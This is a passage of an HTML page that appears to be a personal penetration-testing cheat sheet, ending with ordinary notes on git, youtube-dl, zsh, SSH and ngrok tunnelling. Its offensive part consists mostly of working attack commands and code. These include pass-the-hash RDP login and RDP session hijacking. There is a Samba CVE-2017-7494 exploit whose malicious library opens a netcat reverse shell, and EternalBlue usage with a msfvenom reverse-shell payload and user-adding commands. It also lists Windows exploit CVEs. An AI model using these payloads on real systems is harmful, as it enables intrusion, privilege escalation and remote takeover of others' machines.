+xfreerdp /u:<span style="color:#f92672">[</span>DOMAIN<span style="color:#ae81ff">\]</span>&lt;USERNAME&gt; /pth:&lt;HASH&gt; /v:&lt;IP&gt;
+</code></pre></div><h3 id="session-stealing">Session stealing</h3>
+<h4 id="get-openned-sessions">Get openned sessions</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">query user
+</code></pre></div><h4 id="access-to-the-selected">Access to the selected</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">tscon &lt;ID&gt; /dest:&lt;SESSIONNAME&gt;
+</code></pre></div><h3 id="adding-user-to-rdp-group-windows">Adding user to RDP group (Windows)</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">net localgroup <span style="color:#e6db74">&#34;Remote Desktop Users&#34;</span> &lt;USER&gt; /add
+</code></pre></div><hr>
+<h1 id="cve">Cve</h1>
+<h2 id="cve-2017-7494">CVE-2017-7494</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Download exploit code</span>
+git clone https://github.com/joxeankoret/CVE-2017-7494
+</code></pre></div><p>Create a new file named poc.c :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#include &lt;stdio.h&gt;</span>
+<span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
+
+int samba_init_module<span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>
+<span style="color:#f92672">{</span>
+	setresuid<span style="color:#f92672">(</span>0,0,0<span style="color:#f92672">)</span>;
+	system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ping -c 3 &lt;IP&gt;&#34;</span><span style="color:#f92672">)</span>;
+<span style="color:#f92672">}</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Build</span>
+gcc -o test.so -shared poc.c -fPIC
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Start an ICMP listener</span>
+sudo tcpdump -i &lt;INTERFACE&gt; icmp
+
+<span style="color:#75715e"># Exploit</span>
+./cve_2017_7494.py -t &lt;TARGET_IP&gt; -u &lt;USER&gt; -P &lt;PASSWORD&gt; --custom<span style="color:#f92672">=</span>test.so
+</code></pre></div><p>If you reiceve 3 pings on your listener then the exploit works. Now let’s get a shell :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#include &lt;stdio.h&gt;</span>
+<span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
+
+int samba_init_module<span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>
+<span style="color:#f92672">{</span>
+	setresuid<span style="color:#f92672">(</span>0,0,0<span style="color:#f92672">)</span>;
+	system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f&#34;</span><span style="color:#f92672">)</span>;
+<span style="color:#f92672">}</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Build</span>
+gcc -o test.so -shared poc.c -fPIC
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Start a listener</span>
+nc -lvp &lt;PORT&gt;
+
+<span style="color:#75715e"># Exploit</span>
+./cve_2017_7494.py -t &lt;TARGET_IP&gt; -u &lt;USER&gt; -P &lt;PASSWORD&gt; --custom<span style="color:#f92672">=</span>test.so
+</code></pre></div><h2 id="eternalblue-ms17-010">EternalBlue (MS17-010)</h2>
+<ul>
+<li><a href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010</a></li>
+<li><a href="https://github.com/helviojunior/MS17-010">https://github.com/helviojunior/MS17-010</a></li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#(Checking named pipes)</span>
+python eternal_checker<span style="color:#f92672">.</span>py <span style="color:#960050;background-color:#1e0010">$</span>ip
+
+<span style="color:#75715e">#(send and execute method)</span>
+<span style="color:#e6db74">`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.148 LPORT=443 --platform windows --arch x86 -o shell.exe`</span>
+python send_and_execute<span style="color:#f92672">.</span>py <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10.10</span> shell<span style="color:#f92672">.</span>exe samr
+
+<span style="color:#75715e">#(zzz method)</span>
+python zzz_exploit<span style="color:#f92672">.</span>py <span style="color:#ae81ff">10.11</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1.75</span> <span style="color:#960050;background-color:#1e0010">$</span>pipe
+
+<span style="color:#75715e">#(we can modify the lines to make differents things like add users or disable firewall rules)</span>
+service_exec(conn, <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;cmd /c add user lemon lemon123 /add&#39;</span>)
+
+<span style="color:#75715e">#(to send and execute a file)</span>
+smb_send_file(smbConn, <span style="color:#e6db74">&#39;shell.exe&#39;</span>, <span style="color:#e6db74">&#39;C&#39;</span>, <span style="color:#e6db74">&#39;/windows/temp/shell.exe&#39;</span>)
+service_exec(conn, <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;cmd /c ping 10.10.14.42 &amp;&amp; C:\windows\temp\shell.exe&#39;</span>)
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">CVE
+<span style="color:#75715e"># Already compiled exploit</span>
+https://github.com/SecWiki/windows-kernel-exploits
+https://github.com/abatchy17/WindowsExploits
+</code></pre></div><h3 id="windows-xp">Windows XP</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">CVE	Description
+CVE-2002-1214	ms02_063_pptp_dos - exploits a kernel based overflow when sending abnormal PPTP Control Data packets - code execution, DoS
+CVE-2003-0352	ms03_026_dcom - exploits a stack buffer overflow in the RPCSS service
+CVE-2003-0533	MS04-011 - ms04_011_lsass - exploits a stack buffer overflow in the LSASS service
+CVE-2003-0719	ms04_011_pct - exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack - Private communication target overflow
+CVE-2003-0812	ms03_049_netapi - exploits a stack buffer overflow in the NetApi32
+CVE-2003-0818	ms04_007_killbill - vulnerability in the bit string decoding code in the Microsoft ASN.1 library
+CVE-2003-0822	ms03_051_fp30reg_chunked - exploit <span style="color:#66d9ef">for</span> the chunked encoding buffer overflow described in MS03-051
+CVE-2004-0206	ms04_031_netdde - exploits a stack buffer overflow in the NetDDE service
+CVE-2010-3138	EXPLOIT-DB <span style="color:#ae81ff">14765</span> - Untrusted search path vulnerability - allows local users to gain privileges via a Trojan horse
+CVE-2010-3147	EXPLOIT-DB <span style="color:#ae81ff">14745</span> - Untrusted search path vulnerability in wab.exe - allows local users to gain privileges via a Trojan horse
+CVE-2010-3970	ms11_006_createsizeddibsection - exploits a stack-based buffer overflow in thumbnails within .MIC files - code execution
+CVE-2011-1345	Internet Explorer does not properly handle objects in memory - allows remote execution of code via object
+CVE-2011-5046	EXPLOIT-DB <span style="color:#ae81ff">18275</span> - GDI in windows does not properly validate user-mode input - allows remote code execution
+CVE-2012-4349	Unquoted windows search path - Windows provides the capability of including spaces in path names - can be root
+</code></pre></div><h3 id="windows-7">Windows 7</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">CVE	Description
+CVE-2010-0232	ms10_015_kitrap0d - create a new session with SYSTEM privileges via the KiTrap0D exploit
+CVE-2010-2568	ms10_046_shortcut_icon_dllloader - exploits a vulnerability in the handling of Windows Shortcut files <span style="color:#f92672">(</span>.LNK<span style="color:#f92672">)</span> - run a payload
+CVE-2010-2744	EXPLOIT-DB <span style="color:#ae81ff">15894</span> - kernel-mode drivers in windows <span style="color:#66d9ef">do</span> not properly manage a window class - allows privileges escalation
+CVE-2010-3227	EXPLOIT-DB - Stack-based buffer overflow in the UpdateFrameTitleForDocument method - arbitrary code execution
+CVE-2014-4113	ms14_058_track_popup_menu - exploits a NULL Pointer Dereference in win32k.sys - arbitrary code execution
+CVE-2014-4114	ms14_060_sandworm - exploits a vulnerability found in Windows Object Linking and Embedding - arbitrary code execution
+CVE-2015-0016	ms15_004_tswbproxy - abuses a process creation policy in Internet Explorer’s sandbox - code execution
+CVE-2018-8494	remote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user input
+</code></pre></div><h3 id="windows-8">Windows 8</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">CVE	Description
+CVE-2013-0008	ms13_005_hwnd_broadcast - attacker can broadcast commands from lower Integrity Level process to a higher one - privilege escalation
+CVE-2013-1300	ms13_053_schlamperei - kernel pool overflow in Win32k - local privilege escalation
+CVE-2013-3660	ppr_flatten_rec - exploits EPATHOBJ::pprFlattenRec due to the usage of uninitialized data - allows memory corruption
+CVE-2013-3918	ms13_090_cardspacesigninhelper - exploits CardSpaceClaimCollection class from the icardie.dll ActiveX control - code execution
+CVE-2013-7331	ms14_052_xmldom - uses Microsoft XMLDOM object to enumerate a remote machine’s filenames
+CVE-2014-6324	ms14_068_kerberos_checksum - exploits the Microsoft Kerberos implementation - privilege escalation
+CVE-2014-6332	ms14_064_ole_code_execution - exploits the Windows OLE Automation array vulnerability
+CVE-2014-6352	ms14_064_packager_python - exploits Windows Object Linking and Embedding <span style="color:#f92672">(</span>OLE<span style="color:#f92672">)</span> - arbitrary code execution
+CVE-2015-0002	ntapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalation
+</code></pre></div><h3 id="windows-10">Windows 10</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">CVE	Description
+CVE-2015-0057	exploits GUI component of Windows namely the scrollbar element - allows complete control of a Windows machine
+CVE-2015-1769	MS15-085 - Vulnerability in Mount Manager - Could Allow Elevation of Privilege
+CVE-2015-2426	ms15_078_atmfd_bof MS15-078 - exploits a pool based buffer overflow in the atmfd.dll driver
+CVE-2015-2479	MS15-092 - Vulnerabilities in .NET Framework - Allows Elevation of Privilege
+CVE-2015-2513	MS15-098 - Vulnerabilities in Windows Journal - Could Allow Remote Code Execution
+CVE-2015-2423	MS15-088 - Unsafe Command Line Parameter Passing - Could Allow Information Disclosure
+CVE-2015-2431	MS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code Execution
+CVE-2015-2441	MS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code execution
+</code></pre></div><h4 id="windows-server-2003">Windows Server 2003</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">CVE	Description
+CVE-2008-4250	ms08_067_netapi - exploits a parsing flaw in the path canonicalization code of NetAPI32.dll - bypassing NX
+CVE-2017-8487	allows an attacker to execute code when a victim opens a specially crafted file - remote code execu
+</code></pre></div><hr>
+<h2 id="miscellaneous">MISCELLANEOUS</h2>
+<h3 id="git">Git</h3>
+<p><strong>Config global variables tu logg-in</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">git config --global user.name <span style="color:#e6db74">&#34;Tu Nombre&#34;</span>
+git config --global user.email <span style="color:#e6db74">&#34;correo@domain.com&#34;</span>
+
+<span style="color:#75715e">#(Let running in background Ssh-agent)</span>
+eval <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>ssh-agent -s<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#75715e">#(Creating pair of keys)</span>
+ssh-keygen -t rsa -b <span style="color:#ae81ff">4096</span> -C <span style="color:#e6db74">&#34;user@domain.com&#34;</span>
+
+<span style="color:#75715e">#(Paste our publickey in git)</span>
+https://github.com/settings/keys -&gt; **Settings** -&gt; **Ssh and GPG** -&gt; **New SSH key** -&gt; **Paste our Public Key**
+
+</code></pre></div><p><strong>Creating a proyect</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">mkdir myproyect
+git init
+git add $resource
+git commit -m <span style="color:#e6db74">&#34;submiting a resource&#34;</span>
+git remote add origin git@github.com:&lt;username&gt;/&lt;Repo&gt;.git
+git branch -M main
+git push -u origin main
+</code></pre></div><p><strong>Github</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Quick setup — <span style="color:#66d9ef">if</span> you’ve <span style="color:#66d9ef">done</span> this kind of thing before
+or	
+git@github.com:L3monBit/l3mon-Bspwm.git
+Get started by creating a new file or uploading an existing file. We recommend every repository include a README, LICENSE, and .gitignore.
+
+…or create a new repository on the command line
+echo <span style="color:#e6db74">&#34;# l3mon-Bspwm&#34;</span> &gt;&gt; README.md
+git init
+git add README.md
+git commit -m <span style="color:#e6db74">&#34;first commit&#34;</span>
+git branch -M main
+git remote add origin git@github.com:&lt;Username&gt;/&lt;RepoName&gt;.git
+git push -u origin main
+
+
+
+…or push an existing repository from the command line
+git remote add origin git@github.com:L3monBit/l3mon-Bspwm.git
+git branch -M main
+git push -u origin main
+
+</code></pre></div><h2 id="youtube-dl">youtube-dl</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(The more Simple )</span>
+youtube-dl -i -f mp4 PLlb2ZjHtNkpjg3RAJH6qfJrRWeTaAjULm
+
+youtube-dl &lt;URL&gt;
+youtube-dl -cio <span style="color:#e6db74">&#34;%(title)s.%(ext)s&#34;</span> -f mp4
+
+<span style="color:#75715e">#(to list formats)</span>
+youtube-dl --list-formats URL
+
+<span style="color:#75715e">#(Download prefered format &#39;18&#39;)</span>
+youtube-dl -f <span style="color:#ae81ff">18</span> URL
+
+
+
+<span style="color:#75715e">#### From Github</span>
+
+<span style="color:#75715e"># Basic Download:</span>
+
+youtube-dl URL
+
+<span style="color:#75715e"># Download Playlist, put in folder, and index with order:</span>
+
+youtube-dl -o <span style="color:#e6db74">&#39;%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s&#39;</span> URL
+
+<span style="color:#75715e"># Download to /$uploader/$date/$title.$ext:</span>
+
+youtube-dl -o <span style="color:#e6db74">&#39;%(uploader)s/%(date)s/%(title)s.%(ext)s&#39;</span> URL
+
+<span style="color:#75715e"># Download playlist starting from certain video:</span>
+
+youtube-dl --playlist-start <span style="color:#ae81ff">5</span> example.com/watch?v<span style="color:#f92672">=</span>id&amp;list<span style="color:#f92672">=</span>listid
+
+<span style="color:#75715e"># Simulate download:</span>
+
+youtube-dl -s URL
+
+<span style="color:#75715e"># List Formats:</span>
+
+youtube-dl --list-formats URL
+
+<span style="color:#75715e"># Download preferred format get list of formats &amp; use -f flag:</span>
+
+youtube-dl -f <span style="color:#ae81ff">18</span> URL
+
+<span style="color:#75715e"># Download a list:</span>
+
+- create a file and place all the YouTube links that you wish to download
+
+youtube-dl -a youtube_links.txt
+
+</code></pre></div><h2 id="xdotools">xdotools</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">xdotool key --delay <span style="color:#ae81ff">10</span> <span style="color:#e6db74">&#39;Ctrl+Super_L+alt+Down&#39;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>xdotool key Super_L+Return <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>xdotool key Super_L+Down <span style="color:#f92672">&amp;&amp;</span> w<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>xdotool getactivewindow<span style="color:#66d9ef">)</span> <span style="color:#ae81ff">\ </span>				-&gt; Move to the spawned terminal and obtain de id window
+sleep 0.5  <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>xdotool type --window $w <span style="color:#e6db74">&#39;for x in $(cat /tmp/tmp.BxUSeM2Vz7/uface.txt); do echo $x ; sleep 0.5 ; done&#39;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>xdotool key --window $w Return 
+
+<span style="color:#75715e">#(New Session)</span>
+xdotool key ctrl+b+comma <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>xdotool key --repeat <span style="color:#ae81ff">10</span> <span style="color:#e6db74">&#39;BackSpace&#39;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>xdotool type <span style="color:#e6db74">&#39;Main&#39;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>xdotool key Return
+
+</code></pre></div><h2 id="zsh">Zsh</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(list bindkey)</span>
+bindkey
+<span style="color:#75715e">#(list all the functions)</span>
+zle -al
+
+<span style="color:#75715e">#(list key code)</span>
+showkey -a
+
+<span style="color:#75715e">#(Using a  zsh Shell-builtin)</span>
+zle -N autosuggest-clear
+
+<span style="color:#75715e">#(show code key)</span>
+kev
+
+<span style="color:#75715e">#(property Windows)</span>
+xprop
+</code></pre></div><h2 id="vmware-mount-shared-follder">Vmware Mount Shared Follder</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(To list Folders)</span>
+vmware-hgfsclient 
+
+<span style="color:#75715e">#(Mount)</span>
+sudo vmhgfs-fuse /media/l3mon -o allow_other
+</code></pre></div><h2 id="ssh-tricks">SSh Tricks</h2>
+<p><a href="https://askubuntu.com/questions/871751/cant-ssh-even-with-public-key-added-to-authorized-keys">Articulo SSH</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Username root)</span>
+ssh-copy-id -i id_rsa.pub -p <span style="color:#ae81ff">9999</span> l3mon@localhost				-&gt; Copio mi llave publica en la session de lemon para despues loguearme con mi llave privada
+
+<span style="color:#75715e">#(Username l3mon)</span>
+ssh  -i id_rsa -p <span style="color:#ae81ff">9999</span> l3mon@localhost   			-&gt; con el fichero authorized_keys en la session de lemon puedo loguearme con la llave privada de root
+
+</code></pre></div><h2 id="crontab">Crontab</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">00 0-23/4 * * * /home/l3mon/.config/bin/backup.sh
+</code></pre></div><p><strong>Send notification every time when a crontab run</strong>
+<a href="https://unix.stackexchange.com/questions/560724/unable-to-send-notifications-from-cron-job">https://unix.stackexchange.com/questions/560724/unable-to-send-notifications-from-cron-job</a></p>
+<p>#(Crontab guru)
+<a href="https://crontab.guru/">https://crontab.guru/</a></p>
+<h2 id="remote-port-forwarding">Remote Port Forwarding</h2>
+<p><strong>Linux Machine</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Linux)</span>
+ngrok tcp <span style="color:#ae81ff">9999</span> 			-&gt; Expose the port <span style="color:#ae81ff">9999</span> to outbound
+
+
+<span style="color:#75715e">#(Windows)</span>
+ssh -R 8888:localhost:22 l3mon@2.tcp.ngrok.io -p <span style="color:#ae81ff">17424</span>
+
+<span style="color:#75715e">#(Linux)</span>
+ssh user-pc@localhost -p <span style="color:#ae81ff">8888</span>
+
+</code></pre></div><p><img src="https://i.imgur.com/HU1Poah.png" alt=""></p>
+<p>Ngrok - Proxy Socks with SSH Linux</p>
+<p><strong>Debian Lab</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">#</span>(Linux)
+ssh <span style="color:#f92672">-</span>D <span style="color:#ae81ff">1080</span> l3mon<span style="color:#f92672">@</span><span style="color:#ae81ff">2</span>.tcp.eu.ngrok.io <span style="color:#f92672">-</span>p <span style="color:#ae81ff">14185</span>
+</code></pre></div><p><img src="https://i.imgur.com/rlCU5nC.png" alt=""></p>
+<h2 id="enrutar-paquetes">Enrutar paquetes</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">route <span style="color:#66d9ef">add</span> <span style="color:#f92672">-</span>net <span style="color:#ae81ff">192</span>.<span style="color:#ae81ff">168</span>.<span style="color:#ae81ff">135</span>.<span style="color:#ae81ff">0</span><span style="color:#f92672">/</span><span style="color:#ae81ff">24</span> netmask <span style="color:#ae81ff">255</span>.<span style="color:#ae81ff">255</span>.<span style="color:#ae81ff">255</span>.<span style="color:#ae81ff">0</span> 		
+route <span style="color:#66d9ef">add</span> <span style="color:#66d9ef">default</span> gw <span style="color:#ae81ff">192</span>.<span style="color:#ae81ff">168</span>.<span style="color:#ae81ff">135</span>.<span style="color:#ae81ff">1</span> eth0				<span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">Add</span> <span style="color:#66d9ef">Default</span> Gateway
+route <span style="color:#66d9ef">delete</span> <span style="color:#66d9ef">default</span> gw <span style="color:#ae81ff">192</span>.<span style="color:#ae81ff">168</span>.<span style="color:#ae81ff">135</span>.<span style="color:#ae81ff">1</span> eth0			<span style="color:#f92672">-&gt;</span> Remove Gateway
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
